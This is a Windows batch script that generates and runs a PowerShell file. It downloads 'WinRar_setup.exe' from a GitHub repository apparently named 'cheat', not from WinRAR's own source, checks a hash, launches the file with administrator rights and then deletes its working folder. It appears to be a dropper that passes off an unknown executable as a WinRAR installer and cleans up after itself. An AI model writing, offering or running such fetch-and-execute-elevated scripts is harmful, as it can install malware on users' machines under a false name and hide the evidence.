@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=e8ee1007c8783d601a14a053c8dd01a8995a7e0c8b30ce2d670d18ff738d793c"
set "WORK_DIR=%USERPROFILE%\Downloads\PkgWork"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_FILE=%WORK_DIR%\install.ps1"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"

(
echo $ErrorActionPreference = 'Stop'
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
echo Invoke-WebRequest -Uri '%URL%' -OutFile '%OUT%' -UseBasicParsing
echo $actual = ^(Get-FileHash -LiteralPath '%OUT%' -Algorithm SHA256^).Hash.ToLower^(^)
echo if ^($actual -ne '%HASH%'^) { throw "Hash mismatch: $actual" }
echo Start-Process -FilePath '%OUT%' -Verb RunAs -Wait
) > "%PS_FILE%"

powershell.exe -NoProfile -File "%PS_FILE%"

if exist "%WORK_DIR%" rmdir /s /q "%WORK_DIR%"
exit /b 0
